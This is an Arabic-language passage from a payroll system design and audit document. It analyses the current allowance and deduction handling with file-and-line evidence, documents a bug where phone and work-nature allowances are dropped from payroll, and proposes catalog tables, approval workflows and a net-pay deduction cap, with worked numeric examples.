| 9 | **الصافي سالب** | مُمكن اليوم فعلاً (`payroll.service.ts:345-354` طرح مباشر بلا حد) | `netFloor` + `carryOverExcess` على النسخة |
| 10 | **فجوة/تراكب** في الشرائح | يوم 130 د بلا شريحة → يقع على fallback بالدقيقة بلا قصد | التحقق الحالي `to ≥ from` فقط (`payroll-rules.service.ts:33-47`). أضِف: كشف تراكب + كشف فجوة + **إلزام شريحة مفتوحة `to=null`** |
| 11 | **`monthlyDays` تغيّر** بعد الاعتماد | المسير غير قابل لإعادة الإنتاج | مُجمَّد في `policySnapshot.version` |
| 12 | **`configKeys` تغيّرت** بعد الاعتماد | نفس المشكلة، ومنسيّة عادةً | مُجمَّدة في `policySnapshot.configKeys` |
| 13 | سياسة **أُرشفت** أثناء حساب جارٍ | فشل نصفي | اقرأ النسخة مرة واحدة في بداية الحساب وامسك بها في الذاكرة |
| 14 | موظف **مستثنى من الحضور** (بند ⑨) | يُجسَّد له غياب ويُخصم — **يحدث اليوم فعلاً** (`payroll.service.ts:259, 284-286`) | `version.skipAttendance` + `IS_ATTENDANCE_EXEMPT` + علم على `Employee` |
| 15 | معادلة **> 500 حرف** | ترفض بلا شرح | `MAX_LEN` (`safe-formula.ts:9, 213`) — رسالة واضحة + عدّاد أحرف حيّ في المحرّر |
| 16 | مستخدم غيّر `code` بند مرجوع إليه | تنكسر معادلات أخرى | `code` **غير قابل للتعديل** بعد الحفظ — إعادة التسمية تكون على `nameAr` فقط |
| 17 | حذف بند مرجوع إليه في معادلة | معادلة معطوبة | امنع الحذف واعرض قائمة البنود المعتمدة عليه |
| 18 | **عملات مختلفة** (فرع مصري وفرع سعودي) | جمع تفاح على برتقال | خارج نطاق البند ③ — لكن يجب توثيقه: العملة على مستوى الفرع، والمسير أحادي العملة |

---

### ٣-١٠) خطة تنفيذ مرتّبة (لمبرمج يبدأ من الصفر أو يكمل عندنا)

| # | الخطوة | يمسّ | يعتمد على |
|---|---|---|---|
| 1 | إنشاء الكيانات الثلاثة + `payroll_tier_sets` + `payroll_item_components` + الهجرة | جداول جديدة | — |
| 2 | `buildContext()` في `payroll-context.ts` — تفعيل الكتالوج الميت | جديد | 1 |
| 3 | إضافة `MULTIPLIER` لأنماط الشرائح | `payroll-rules.entities.ts:6` · `payroll-rules.service.ts:41-47` · `payroll.service.ts:78-80` · `payroll-rules.controller.ts:29` · `src/app/payroll/formulas/page.tsx:164` | — |
| 4 | إضافة `gt/lt/gte/lte/eq/ifp` للقائمة البيضاء | `safe-formula.ts:11-26` | — |
| 5 | `PolicyEngineService.run(ctx, snapshot)` — الترتيب الطوبولوجي + المراحل + الـroll-up | جديد | 2,3,4 |
| 6 | CRUD السياسات + التحقق (حلقات + معادلات + شرائح) + المعاينة على موظف | جديد | 5 |
| 7 | `dryRun` + `policySnapshot` + `snapshotHash` في `calculateDefined` | `payroll.service.ts:149-402` | 5 |
| 8 | **بوابة التكافؤ** — `SYSTEM_DEFAULT_V1` + endpoint المقارنة + الـ14 عموداً | جديد | 7 |
| 9 | تمرير `policyId/policyVersionId` في الـDTO (**ناقص اليوم**) | `payroll.controller.ts:34-60` · `src/lib/api.ts` (لا يوجد `calculateDefined` أصلاً) | 7 |
| 10 | شاشة محرّر السياسة (توسعة `formulas/page.tsx` من 213 سطر) | واجهة | 6 |
| 11 | `payroll.engine_mode=SHADOW` — شهران تشغيل ومقارنة | إعدادات | 8 |
| 12 | التبديل إلى `POLICY` بعد عبور البوابة | — | 11 |

**الخطوات 1–5 هي المحرك. الخطوة 8 هي بوابة الأمان. لا تبديل بلا عبورها.**

---

## ٤) البدلات والخصومات والإعفاءات والمستثنون

هذا القسم يغطي البنود ⑥ ⑦ ⑧ ⑨ من مواصفة صاحب النظام. كل بند مكتوب بترتيب واحد: **المطلوب ← الحالة عندنا الآن (بالدليل) ← التصميم المقترح ← أمثلة محسوبة ← حالات حدّية**، عشان المبرمج يقدر ينفّذه من الصفر في أي نظام.

---

### ٤-أ) البدلات (⑥)

#### المطلوب (من المواصفة)
- إضافة **بدلات دائمة** للموظف — بعض الموظفين لهم بدلات بشكل دائم.
- البدل **يظهر للموظف**، وأنا أقرّر أحطّه له أو لا.
- (استنتاج تشغيلي لازم) البدل يدخل المسير **مفصّلاً** في القسيمة، لا مجمَّعاً في رقم واحد.

#### الحالة عندنا الآن

| العنصر | الحالة | الدليل (ملف:سطر) |
|---|---|---|
| كتالوج أنواع بدلات (`AllowanceType`) | **غير موجود إطلاقاً** — لا كيان ولا جدول ولا CRUD | بحث شامل عن `allowance_types` = صفر نتائج |
| البدلات كيف تُخزَّن | **٥ أعمدة ثابتة على الموظف** لا أكثر | `api/src/employees/employee.entity.ts:206-220`: `housingAllowance`, `transportAllowance`, `phoneAllowance`, `workNatureAllowance`, `otherAllowance` |
| تاريخ سريان / انتهاء للبدل | **غير موجود** — العمود قيمة واحدة بلا تاريخ ولا تاريخ | نفس السطور |
| هل البدل خاضع للتأمينات؟ | **غير موجود** — فيه `gosiBaseSalary` على الموظف لكنه **لا يُقرأ في أي حساب** | `employee.entity.ts:244` · grep على `api/src` = يظهر في الكيان والـDTO فقط |
| البدل في القسيمة | **مجمَّع في رقم واحد** — القسيمة لا تقدر تفصّله | `payroll.entities.ts:116-117` عمود `allowances` واحد |
| شاشة البدلات | **placeholder صريح، صفر API** | `src/app/payroll/allowances/page.tsx:22` — «هذه الوحدة تُفعَّل في مرحلة لاحقة» (48 سطراً فقط) |
| بدل لمرة واحدة | **موجود التفافياً** — طلب `PER_DIEM` بمعالج `payroll_allowance` → قيد CREDIT في دفتر المديونيات | `requests-seed.data.ts:166` · `destinations.service.ts:751` |

**المعادلة الفعلية في المسير اليوم** (`api/src/payroll/payroll.service.ts:227-231`):

```ts
const allowances =
  Number(emp.housingAllowance ?? 0) +
  Number(emp.transportAllowance ?? 0) +
  Number(emp.otherAllowance ?? 0)
const gross = basic + allowances          // أساس dayRate/hourRate/minuteRate كله
```

---

#### ⚠️ خلل قائم مؤكَّد — بدل الهاتف وبدل طبيعة العمل لا يدخلان المسير

**الوصف الدقيق:** العمودان `phoneAllowance` و `workNatureAllowance` موجودان على كيان الموظف، **ومعروضان للمالك على شاشة ملف الموظف كرقمين مستقلين** (`src/app/employees/[id]/page.tsx:1465, 1469`)، لكن **المسير لا يقرأهما إطلاقاً**. المسير يقرأ `otherAllowance` فقط.

الجسر الوحيد بينهما موجود **في الواجهة الأمامية** — سطر واحد في نموذج الموظف (`src/components/EmployeeForm.tsx:674-677`):

```ts
const otherAllowance =
  (Number(form.phoneAllowance) || 0) + (Number(form.workNatureAllowance) || 0)
if (form.phoneAllowance !== '' || form.workNatureAllowance !== '')
  payload.otherAllowance = otherAllowance
```

**لا يوجد أي مزامنة في الباك إند.** تحقّق: `grep otherAllowance api/src` يرجّع 4 نتائج فقط — الكيان (`employee.entity.ts:212,220`)، الـDTO (`employees.dto.ts:297,634`)، المسير (`payroll.service.ts:230`)، وتصفية نهاية الخدمة (`offboarding.service.ts:230`). **ولا سطر واحد يعيد حسابها.**

**الخطر — ثلاثة سيناريوهات فشل حقيقية:**

| # | السيناريو | النتيجة |
|---|---|---|
| **F1 — بدل يسقط بصمت** | أي كتابة على الموظف **من غير نموذج `EmployeeForm`**: استيراد جماعي، سكربت، `PATCH /employees/:id` مباشر، أو أي شاشة تانية تعدّل الراتب. الـDTO يقبل `phoneAllowance` وحده (`employees.dto.ts:622`) بلا أي إلزام بـ`otherAllowance` | الشاشة تعرض «بدل هاتف 300» والمسير يدفع **صفر**. الفرق لا يظهر في أي تقرير لأن المصدرين مختلفان |
| **F2 — بدل شبح يُدفع للأبد** | البدل أُلغي بتحديث `phoneAllowance = 0` عبر أي مسار غير النموذج → `otherAllowance` يفضل 300 | يُدفع 300 شهرياً لموظف الشاشة بتقول إن بدله صفر. **ولا أحد يلاحظ** |
| **F3 — `otherAllowance` فقد معناه** | النموذج **يدهس** قيمة `otherAllowance` بمجموع (هاتف + طبيعة عمل) عند كل حفظ | لا يوجد مكان أصلاً لتسجيل بدل ثالث حقيقي («بدل سكن إضافي»، «بدل خطورة»). لو حد سجّله في `otherAllowance` → أول حفظ للنموذج يمحوه |

**والخطر يمتد لتصفية نهاية الخدمة**: `api/src/offboarding/offboarding.service.ts:226-230` يستخدم **نفس الجمع الثلاثي** لبناء `gross` الذي تُحسب عليه مكافأة نهاية الخدمة. يعني بدل الهاتف الساقط يسقط كمان من مكافأة نهاية الخدمة — بأثر تراكمي على كل سنوات الخدمة.

**مثال رقمي للفرق:**

```
موظف: أساسي 6,000 · سكن 1,500 · انتقال 500 · هاتف 300 · طبيعة عمل 200
payroll.monthly_days = 30 · payroll.daily_hours = 8

الصحيح:  gross = 8,500 → dayRate = 283.33 → hourRate = 35.42 → minuteRate = 0.5903
الواقع (F1): gross = 8,000 → dayRate = 266.67 → hourRate = 33.33 → minuteRate = 0.5556

الفرق الشهري في الاستحقاق  = 500.00 ريال
الفرق في خصم يوم غياب      = 16.66 ريال (لصالح الموظف — يعني الحساب غلط في الاتجاهين)
الفرق في ساعة أوفرتايم ×1.5 = 3.13 ريال
سنوياً للموظف الواحد        = 6,000 ريال
لو 40 موظف لهم بدل هاتف     = 240,000 ريال سنوياً — بفارق صامت لا يظهر في تقرير
```

**الإصلاح — على مرحلتين:**

**(١) إصلاح عاجل، سطر واحد** — يوقف النزيف فوراً ويظل متوافقاً مع البيانات القديمة:

```ts
// api/src/payroll/payroll.service.ts:227  (ونفس التعديل في offboarding.service.ts:226)
// otherAllowance تاريخياً = phone + workNature (يملؤها النموذج). لو العمودان
// الجديدان مضبوطين فهما مصدر الحقيقة؛ وإلا نرجع لـotherAllowance القديم.
const phone = Number(emp.phoneAllowance ?? 0)
const nature = Number(emp.workNatureAllowance ?? 0)
const legacyOther = Number(emp.otherAllowance ?? 0)
const splitTotal = phone + nature
const otherTotal =
  emp.phoneAllowance == null && emp.workNatureAllowance == null
    ? legacyOther                                  // صف قديم لم يُقسَّم بعد
    : Math.max(splitTotal, legacyOther)            // لا يسقط بدل ولا يُدفع شبح
const allowances =
  Number(emp.housingAllowance ?? 0) + Number(emp.transportAllowance ?? 0) + otherTotal
```
ويُرافقه **hook في `employees.service.ts`** يعيد حساب `otherAllowance = phone + nature` عند أي `create/update` يمسّ أياً من العمودين — عشان لا نعتمد على الواجهة أبداً. وتقرير تحقّق لمرة واحدة يسرد كل موظف عنده `phoneAllowance + workNatureAllowance ≠ otherAllowance`.

**(٢) الإصلاح الجذري** — كتالوج بدلات يلغي الأعمدة الثابتة نهائياً (التصميم التالي). الأعمدة الخمسة تبقى **للقراءة التاريخية فقط** بعد ترحيلها لصفوف في `employee_allowances`.

---

#### التصميم المقترح — كتالوج بدلات + إسناد بتاريخ سريان

**كيان ١: نوع البدل (الكتالوج)**

```
allowance_types
─────────────────────────────────────────────────────────────────────
id                int PK
code              varchar(30)  UNIQUE   -- HOUSING, TRANSPORT, PHONE, WORK_NATURE, RISK...
nameAr            varchar(120)          -- «بدل سكن»
nameEn            varchar(120) NULL
calcMethod        varchar(20)           -- FIXED | PERCENT_OF_BASIC | PERCENT_OF_GROSS | PER_DAY_WORKED
defaultValue      decimal(18,2) NULL    -- القيمة/النسبة الافتراضية عند الإسناد
isTaxable         bit  default 1        -- خاضع للضريبة/الزكاة
isGosiSubject     bit  default 0        -- يدخل وعاء التأمينات (GOSI) — لحساب الاشتراك
inOvertimeBase    bit  default 1        -- يدخل قاعدة سعر الساعة للأوفرتايم؟
inDeductionBase   bit  default 1        -- يدخل قاعدة سعر اليوم للتأخير/الغياب؟
inEosBase         bit  default 1        -- يدخل قاعدة مكافأة نهاية الخدمة؟
prorateOnPartial  bit  default 1        -- يتناسب مع أيام الخدمة داخل الفترة؟
glAccount         varchar(40) NULL      -- الحساب المحاسبي (للترحيل المحاسبي لاحقاً)
sortOrder         int  default 100      -- ترتيب الظهور في القسيمة
isActive          bit  default 1
```

> **ملاحظة تصميمية مهمة:** الأعلام الأربعة `inOvertimeBase / inDeductionBase / inEosBase / isGosiSubject` هي **جوهر المرونة**. اليوم النظام يجمع كل شيء في `gross` واحد ويحسب عليه كل حاجة (`payroll.service.ts:231-234`) — يعني بدل السكن يزوّد سعر ساعة الأوفرتايم وسعر يوم خصم الغياب، وده غالباً مش المقصود. الأعلام دي بتفصّل **أربع قواعد حساب** بدل قاعدة واحدة.

**كيان ٢: إسناد البدل للموظف (دائم، بتاريخ سريان)**

```
employee_allowances
─────────────────────────────────────────────────────────────────────
id                int PK
employeeId        int  FK employees      INDEX
allowanceTypeId   int  FK allowance_types
value             decimal(18,2)          -- مبلغ أو نسبة % حسب calcMethod للنوع
effectiveFrom     date                   -- تاريخ السريان (إلزامي)
effectiveTo       date NULL              -- NULL = ساري بلا نهاية
isActive          bit default 1
note              varchar(300) NULL      -- سبب المنح («بدل هاتف — مندوب مبيعات»)
createdByUserId   int NULL
createdAt         datetime
─────────────────────────────────────────────────────────────────────
INDEX (employeeId, allowanceTypeId, effectiveFrom)
CHECK: effectiveTo IS NULL OR effectiveTo >= effectiveFrom
قاعدة تطبيقية: منع تداخل فترتين لنفس (employeeId, allowanceTypeId)
```

**كيان ٣: تفصيل القسيمة (يلغي الرقم المجمَّع)**

```
payroll_item_lines          -- سطر لكل بند في قسيمة كل موظف
─────────────────────────────────────────────────────────────────────
id            int PK
itemId        int FK payroll_items   INDEX
kind          varchar(15)   -- EARNING | DEDUCTION
sourceType    varchar(30)   -- ALLOWANCE | BASIC | OVERTIME | LATENESS | ABSENCE |
                            --  UNPAID_LEAVE | LOAN | OBLIGATION | TYPED_DEDUCTION | BONUS
sourceId      int NULL      -- allowanceTypeId / deductionTypeId / loanId / obligationId
label         varchar(200)  -- «بدل هاتف»
qty           decimal(10,2) NULL   -- أيام/ساعات/دقائق (للشفافية)
rate          decimal(18,4) NULL   -- سعر الوحدة المستخدَم
amount        decimal(18,2)        -- المبلغ المرحَّل للصافي (بعد الإعفاء)
grossAmount   decimal(18,2)        -- المبلغ قبل الإعفاء (للعرض عند الإعفاء)
exemptionId   int NULL FK payroll_exemptions   -- إن كان معفياً
```

> `PayrollItem.allowances` و`otherDeductions` وإخوانهما يبقوا **حقول مجمَّعة مشتقّة** (لتوافق الشاشات والتقارير الحالية) — والحقيقة التفصيلية تصير في `payroll_item_lines`. القسيمة تُبنى من السطور لا من المجاميع.

**قواعد الاحتساب:**

```
resolveAllowances(employee, periodStart, periodEnd):
  rows = employee_allowances
         WHERE employeeId = emp.id AND isActive = 1
           AND effectiveFrom <= periodEnd
           AND (effectiveTo IS NULL OR effectiveTo >= periodStart)

  لكل صف:
    switch type.calcMethod:
      FIXED             → amount = row.value
      PERCENT_OF_BASIC  → amount = basicSalary × row.value / 100
      PERCENT_OF_GROSS  → amount = (basic + Σ البدلات الثابتة) × row.value / 100   ← تُحسب في دورة ثانية
      PER_DAY_WORKED    → amount = row.value × أيام الحضور الفعلية داخل الفترة

    -- التناسب مع سريان جزئي داخل الفترة
    if type.prorateOnPartial:
       coveredDays = عدد أيام تقاطع [effectiveFrom, effectiveTo] مع [periodStart, periodEnd]
       periodDays  = عدد أيام الفترة
       amount = amount × coveredDays / periodDays

القواعد الأربع (بدل قاعدة gross الواحدة):
  gross           = basic + Σ كل البدلات السارية
  deductionBase   = basic + Σ البدلات التي inDeductionBase = 1
  overtimeBase    = basic + Σ البدلات التي inOvertimeBase  = 1
  gosiBase        = basic + Σ البدلات التي isGosiSubject   = 1
  eosBase         = basic + Σ البدلات التي inEosBase       = 1

  dayRate    = deductionBase / payroll.monthly_days
  hourRate   = (overtimeBase / payroll.monthly_days) / payroll.daily_hours
  minuteRate = hourRate / 60
```

**مثال رقمي كامل:**

```
موظف: أساسي 6,000
  سكن       PERCENT_OF_BASIC 25%  · inDeductionBase=1 · inOvertimeBase=1 · isGosiSubject=1
  انتقال    FIXED 500             · inDeductionBase=1 · inOvertimeBase=1 · isGosiSubject=0
  هاتف      FIXED 300             · inDeductionBase=0 · inOvertimeBase=0 · isGosiSubject=0
  طبيعة عمل FIXED 200             · inDeductionBase=1 · inOvertimeBase=0 · isGosiSubject=0

سكن = 6,000 × 25% = 1,500

gross          = 6,000 + 1,500 + 500 + 300 + 200 = 8,500
deductionBase  = 6,000 + 1,500 + 500 + 200       = 8,200   (بدون الهاتف)
overtimeBase   = 6,000 + 1,500 + 500             = 8,000   (بدون هاتف وطبيعة عمل)
gosiBase       = 6,000 + 1,500                   = 7,500

dayRate    = 8,200 / 30 = 273.33
hourRate   = (8,000 / 30) / 8 = 33.33
minuteRate = 0.5556

→ يوم غياب يخصم 273.33 (مش 283.33 لو حسبناه على gross الكامل)
→ ساعة أوفرتايم ×1.5 = 50.00
→ اشتراك GOSI الموظف 9% = 675.00

والقسيمة تظهر كده (سطر لكل بدل، لا رقم مجمَّع):
  الراتب الأساسي ............ 6,000.00
  بدل سكن (25% من الأساسي) .. 1,500.00
  بدل انتقال ................   500.00
  بدل هاتف ..................   300.00
  بدل طبيعة عمل .............   200.00
  ─────────────────────────────────────
  إجمالي الاستحقاق .......... 8,500.00
```

**ظهور البدل للموظف:** endpoint جديد `GET /me/allowances` (خدمة ذاتية بلا صلاحيات، على نمط `GET /payroll/my-payslips` — `payroll.controller.ts:133-136`) يرجّع البدلات السارية باسم النوع والقيمة وتاريخ السريان. **الموظف لا يرى `inDeductionBase` ولا `glAccount`** — أعلام إدارية داخلية.

**حالات حدّية للبدلات:**

| الحالة | القاعدة |
|---|---|
| بدل ابتدأ نصف الفترة (سرى 2026-08-05 والفترة 23/7→22/8) | `prorateOnPartial=1` → 300 × (18 يوم ÷ 31 يوم) = **174.19**. `prorateOnPartial=0` → 300 كاملة |
| بدل انتهى داخل الفترة | نفس القاعدة معكوسة — بالتقاطع |
| بدلان من نفس النوع بفترتين متداخلتين | **يُمنع عند الحفظ** (تحقق تداخل). المسموح: تسلسل — أغلق القديم بـ`effectiveTo` وافتح الجديد |
| `PERCENT_OF_BASIC` مع زيادة راتب داخل الفترة | البدل يُحسب على **الأساسي وقت الحساب** (`emp.basicSalary` لحظة تشغيل المسير). لو مطلوب دقة أعلى → تقسيم الفترة قبل/بعد تاريخ الزيادة (مرحلة تالية، ويتطلب سجل تاريخ الرواتب من `salary_update_history`) |
| بدل على موظف **مستثنى من الحضور** | يُصرف كاملاً — الاستثناء يمنع الخصومات لا الاستحقاقات (شوف ٤-د) |
| بدل بنسبة على موظف براتب صفر/فارغ | `basicSalary NULL` → البدل = 0 مع تحذير في `breakdown` بدل الانهيار |

---

### ٤-ب) الخصومات بأنواع (⑦)

#### المطلوب (من المواصفة)
- **خصومات بأنواع** يعرّفها المستخدم: جودة · التزام · إداري · إنتاجية — وتأتي من أقسام مختلفة.
- **مدير الإدارة/القسم ينزّل خصماً على موظفيه بحسب الصلاحية** (مدير مباشر / مدير فريق / مدير قسم). مثال: مدير الجودة هو من ينزّل «خصم جودة».
- الخصم **يظهر للموظف على النظام بمجرد نزوله**.
- الخصم يمشي في **دورة اعتمادات** (تصل للموارد البشرية) ثم **ينزل في المسير مباشرة**.
- الهدف: إلغاء الورق والإدخال اليدوي من HR.

#### الحالة عندنا الآن

| العنصر | الحالة | الدليل |
|---|---|---|
| كتالوج «أنواع خصومات» | **غير موجود** — لا كيان `DeductionType` | بحث شامل = صفر نتائج |
| البديل القائم | **حقل نصّي حر** `category` بلا FK ولا تحقّق ولا جدول | `financial.entities.ts:71-73` — القائمة (`custody_shortfall\|bonus\|allowance\|adjustment\|expense\|fine\|manual`) موجودة **في تعليق فقط**؛ `obligations.service.ts:48` يقبل أي نص: `category: (dto.category ?? 'manual').trim() \|\| 'manual'` |
| **من يملك إنزال خصم** | **HR فقط** | `POST /obligations` محمي بـ`@Perm('payroll.calculate')` — `obligations.controller.ts:60-61`. وهذه الصلاحية ممنوحة لـ`hr_manager` و`super_admin` **فقط** (`auth/permissions.ts:88`). **`branch_manager` عنده صفر صلاحيات payroll** (`permissions.ts:97-110`) |
| **دورة اعتماد للخصم** | **غير موجودة** | `obligations.service.ts:44-55` ينشئ القيد مباشرة بـ`status: 'PENDING'` — بلا خطوة اعتماد واحدة. أي شخص عنده `payroll.calculate` يخصم فوراً |
| مسار طلب ينشئ خصماً | **غير موجود** | كل معالجات الطلبات المالية تنشئ **CREDIT** (`destinations.service.ts:751-754`). الـ`DEBIT` الوحيد آلي: عهدة مفقودة (`destinations.service.ts:703-715`). **لا يوجد نوع طلب اسمه «خصم»** في كتالوج الـ44 نوعاً (`requests-seed.data.ts:138-200`) |
| ظهوره للموظف | **لا يظهر** | `GET /obligations/employee/:id` محمي بـ`@Perm('payroll.view')` (`obligations.controller.ts:54-55`) — الموظف لا يملكها. والقسيمة لا تظهر له إلا بعد اعتماد المسير (`payroll.service.ts:481`: `if (run.status === 'CALCULATED') continue`) |
| تقسيط الخصم | **غير موجود** | `payroll.service.ts:329-338` يخصم **كامل المبلغ دفعة واحدة** |
| سقف نسبة الخصم من الصافي | **غير موجود** | `payroll.service.ts:345-354` طرح مباشر — **`netPay` يمكن أن يصير سالباً** |
| شاشة إدخال خصم | **غير موجودة** | `src/app/payroll/deductions/page.tsx` **عرض فقط** — تقرأ `otherDeductions` من بنود المسير (`:99-110`) ولا ترسل أي POST |

**الخلاصة:** المطلوب في المواصفة هو بالضبط عكس الحالة الراهنة. المواصفة تقول «بدل ما تتعمل ورقي والموارد البشرية تُدخلها يدويًا» — والنظام اليوم **لا يسمح لأي أحد غير HR بإدخالها، ويدخلها بلا اعتماد على الإطلاق**.

**البنية التحتية الجاهزة للاستفادة (نقطة إيجابية مهمة):** سلاسل الاعتماد الموجودة قوية وتكفي المطلوب بلا بناء جديد — `ApprovalChain` تدعم **سلسلة لكل فرع** (`approval-chain.entity.ts:5, 19-20`: نسخة عامة `branchId=NULL` + نسخة لكل فرع بنفس الكود) و`ApprovalStep` تدعم **خطوات شرطية بعتبة مبلغ** (`approval-step.entity.ts:50-59`: `thresholdField/thresholdOp/thresholdValue`) و**SLA وتصعيد** (`:61-65`) و**١١ دوراً يُحلّون ديناميكياً من الهيكل** (`:11-23`). ده يعني إن دورة اعتماد الخصومات **إعادة استخدام لا بناء**.

---

#### التصميم المقترح

**كيان ١: نوع الخصم (الكتالوج)**

```
deduction_types
─────────────────────────────────────────────────────────────────────
id                  int PK
code                varchar(30) UNIQUE   -- QUALITY, COMPLIANCE, ADMIN, PRODUCTIVITY...
nameAr              varchar(120)         -- «خصم جودة»
calcMethod          varchar(20)          -- AMOUNT | PERCENT_OF_BASIC | PERCENT_OF_GROSS | DAYS
                                         -- DAYS ⇒ amount = value × dayRate
defaultValue        decimal(18,2) NULL
minValue            decimal(18,2) NULL   -- أدنى قيمة مسموحة للنوع
maxValue            decimal(18,2) NULL   -- سقف القيمة الواحدة («خصم الجودة لا يتجاوز 500»)
maxPerMonth         decimal(18,2) NULL   -- سقف تراكمي شهري لهذا النوع على الموظف الواحد
requiresEvidence    bit default 0        -- يلزم مرفق (تقرير جودة/محضر)
allowInstallments   bit default 1        -- يجوز تقسيطه؟
maxInstallments     int default 1
approvalChainCode   varchar(50) NULL     -- سلسلة الاعتماد لهذا النوع (FK منطقي لـapproval_chains.code)
issuerPermission    varchar(60)          -- الصلاحية اللازمة للإنزال، مثل 'deduction.issue.quality'
issuerScope         varchar(20)          -- OWN_TEAM | OWN_DEPARTMENT | OWN_BRANCH | COMPANY
priority            int default 100      -- أولوية الاستيفاء عند تفعيل سقف الصافي (الأقل = أولاً)
glAccount           varchar(40) NULL
isActive            bit default 1
```

**كيان ٢: الخصم المُنزَّل (الحدث)**

```
employee_deductions
─────────────────────────────────────────────────────────────────────
id                int PK
employeeId        int FK employees   INDEX      -- المخصوم عليه
deductionTypeId   int FK deduction_types
totalAmount       decimal(18,2)                 -- القيمة المحسوبة الكاملة
installments      int default 1                 -- عدد الأشهر (1 = دفعة واحدة)
reason            varchar(500)                  -- السبب — إلزامي
evidenceFileId    int NULL                      -- مرفق (لو requiresEvidence)
status            varchar(20)   -- DRAFT | PENDING_APPROVAL | APPROVED | REJECTED
                                --  | POSTED | PARTIALLY_APPLIED | APPLIED | CANCELLED
requestId         int NULL FK requests          -- الطلب الذي يحمل دورة الاعتماد
issuedByUserId    int                           -- مين نزّله
issuedAt          datetime
approvedByUserId  int NULL
approvedAt        datetime NULL
effectiveFrom     date                          -- من أي مسير يبدأ الاستيفاء
createdAt         datetime
─────────────────────────────────────────────────────────────────────
INDEX (employeeId, status)
```

**دورة الحياة الكاملة:**

```
1. المدير المخوَّل ينزّل الخصم
   POST /deductions  { employeeId, deductionTypeId, value, reason, installments, evidenceFileId }
   ← تحقّق: هل عند المستخدم type.issuerPermission؟
   ← تحقّق: هل الموظف داخل type.issuerScope الخاص بالمُنزِّل؟ (فريقه/قسمه/فرعه)
   ← تحقّق: minValue ≤ القيمة ≤ maxValue
   ← تحقّق: مجموع النوع على الموظف هذا الشهر + القيمة ≤ maxPerMonth
   ← تحقّق: installments ≤ type.maxInstallments (و allowInstallments = 1)
   ← تحقّق: evidenceFileId موجود لو requiresEvidence = 1
   ⇒ الحالة PENDING_APPROVAL

2. ينشأ Request بنوع DEDUCTION_ISSUE و chain = type.approvalChainCode
   requesterId    = employeeId (المخصوم عليه — عشان الأدوار تُحلّ على هيكله)
   createdByUserId = المُنزِّل
   ⚠️ حماية إلزامية: لو المُنزِّل هو نفسه صاحب خطوة اعتماد → تُتخطّى تلقائياً
      (وإلا مدير القسم يخصم ويعتمد لنفسه لأن direct_manager_of_requester = هو)

3. الموظف يشوفه فوراً — الحالة «بانتظار الاعتماد»  ← تنفيذ المواصفة «يظهر للموظف بمجرد نزوله»
   وله زر «اعتراض» → ينشئ طلب DEDUCTION_OBJECTION (النوع موجود بالفعل —
   requests-seed.data.ts:168، chain: CHAIN_HR_FINANCE)

4. اكتمال السلسلة → status = APPROVED
   ⇒ يُقيَّد في دفتر المديونيات (EmployeeObligation) — قيد واحد لكل قسط:
      installments = 1 → قيد واحد DEBIT بـtotalAmount, effectiveDate = effectiveFrom
      installments = N → N قيود DEBIT بـtotalAmount/N، effectiveDate يتقدّم شهراً كل مرة
      كل قيد: category = deductionType.code, sourceRef = 'deduction:<id>'
   ⇒ status = POSTED

5. المسير يستهلكه — بلا أي تعديل في محرك المسير (payroll.service.ts:325-338 يقرأ الدفتر بالفعل)
   ⇒ عند الصرف: PENDING → APPLIED (payroll.service.ts:443-448) — استهلاك مرة واحدة مضمون

6. اكتمال كل الأقساط ⇒ employee_deductions.status = APPLIED
```

> **قرار معماري:** لا نبني قناة خصم موازية — نستخدم **دفتر المديونيات الموجود** (`EmployeeObligation`) كجسر بين الخصم والمسير. الدفتر مختبَر ومحكم: يُستهلك مرة واحدة فقط (`payroll.service.ts:443-448`)، ومربوط بمصدره (`sourceRequestId`/`sourceRef`)، وله `effectiveDate` (`financial.entities.ts:86-87`) — وهو بالضبط آلية التقسيط الجاهزة. **التعديل الوحيد المطلوب على الدفتر: إضافة `deductionTypeId int NULL` بجانب `category` النصّي** ليصير التصنيف مُتحقَّقاً منه بـFK.

**الصلاحيات — ربط النوع بمن يملك إنزاله:**

```
تُضاف لكتالوج الصلاحيات (api/src/auth/permissions.ts:39-42 بعد payroll.*):
  'deduction.issue.quality'        : 'إنزال خصم جودة'
  'deduction.issue.compliance'     : 'إنزال خصم التزام'
  'deduction.issue.admin'          : 'إنزال خصم إداري'
  'deduction.issue.productivity'   : 'إنزال خصم إنتاجية'
  'deduction.view_all'             : 'عرض كل الخصومات'
  'deduction.exempt'               : 'إعفاء موظف من خصم'      ← يخدم البند ⑧

فحص النطاق (issuerScope) وقت الإنزال — مفتاح تحقيق مطلب «على موظفيه»:
  OWN_TEAM       : target.teamId       ∈ الفرق التي يديرها المُنزِّل
  OWN_DEPARTMENT : target.departmentId ∈ الأقسام التي يديرها
  OWN_BRANCH     : target.branchId     = branchScopeOf(user)   ← الدالة موجودة: auth/guards.ts:73
  COMPANY        : بلا قيد (لـHR/الجودة المركزية)
```

مثال حيّ من المواصفة: مدير الجودة يُمنح `deduction.issue.quality` ونوع «خصم جودة» بـ`issuerScope = COMPANY` (لأن الجودة وظيفة عرضية تمسّ كل الفروع)، بينما مدير الفرع يُمنح `deduction.issue.admin` بـ`issuerScope = OWN_BRANCH` (يخصم إدارياً على موظفي فرعه فقط).

**السقف من صافي الراتب + الترحيل:**

```
مفاتيح إعدادات جديدة (تُضاف لـ configSeed — requests-seed.data.ts:236):
  payroll.max_deduction_pct_of_net = '50'   -- لا تتجاوز الخصومات 50% من الصافي قبلها
  payroll.min_net_floor            = '0'    -- أرضية مطلقة للصافي
  payroll.carry_over_excess        = 'true' -- رحّل الفائض للمسير التالي بدل إسقاطه

خوارزمية الاستيفاء (تحلّ مشكلة netPay السالب — payroll.service.ts:345-354):
  netBefore   = gross + otAmount + otherAdditions
  allowedMax  = max(netBefore × pct/100, netBefore − minNetFloor)
  الخصومات مرتّبة تصاعدياً بـdeduction_type.priority:
     10  خصومات قانونية/حكم قضائي   (لا تخضع للسقف — تُستوفى أولاً وكاملة)
     20  أقساط السلف
     30  عهدة مفقودة
     40  خصومات تأديبية بأنواعها
     50  خصومات التأخير والغياب
  خُذ من الأعلى حتى نفاد allowedMax؛ الباقي يُرحَّل:
     obligation.effectiveDate = بداية الفترة التالية  (نفس القيد، تاريخ جديد)
     ويُسجَّل في breakdown.carriedOver[] للتدقيق
```

**أمثلة رقمية:**

```
مثال ١ — خصم جودة مقسَّط على 3 أشهر
  نوع: QUALITY · calcMethod = AMOUNT · maxValue = 1,500 · maxInstallments = 3
  مدير الجودة نزّل 1,200 بسبب «تكرار عيوب إنتاج — محضر QC-2026-88» + مرفق
